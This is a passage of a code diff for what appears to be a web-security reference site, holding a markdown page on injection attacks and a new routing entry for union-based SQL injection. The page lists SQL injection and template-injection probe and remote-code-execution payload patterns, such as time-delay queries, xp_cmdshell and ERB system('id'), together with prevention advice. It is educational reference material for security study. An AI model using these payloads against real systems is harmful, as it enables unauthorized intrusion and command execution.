4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
 
@@ -5206,6 +7203,7 @@ var SUBTYPE_CHILDREN = {
   'cat-01:SQL Injection': [
     {name: 'Classic / In-Band', slug: 'sqli-classic-inband', done: true},
     {name: 'Error-Based', slug: 'sqli-error-based', done: true},
+    {name: 'Union-Based', slug: 'sqli-union-based', done: true},
     {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean', done: true}
   ]
 };
@@ -5359,6 +7357,7 @@ function renderPage(hash) {
   else if (hash === 'tools') { document.title = 'GORGE | Tools Index'; renderMarkdownPage(PAGES.tools); }
   else if (hash === 'labs') { document.title = 'GORGE | Lab Environments'; renderMarkdownPage(PAGES.labs); }
   else if (hash === 'sqli-classic-inband') { document.title = 'GORGE | Classic In-Band SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Classic / In-Band SQLi', PAGES.sqli_classic_inband); }
+  else if (hash === 'sqli-union-based') { document.title = 'GORGE | Union-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Union-Based SQLi', PAGES.sqli_union_based); }
   else if (hash === 'sqli-error-based') { document.title = 'GORGE | Error-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Error-Based SQLi', PAGES.sqli_error_based); }
   else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
   else {
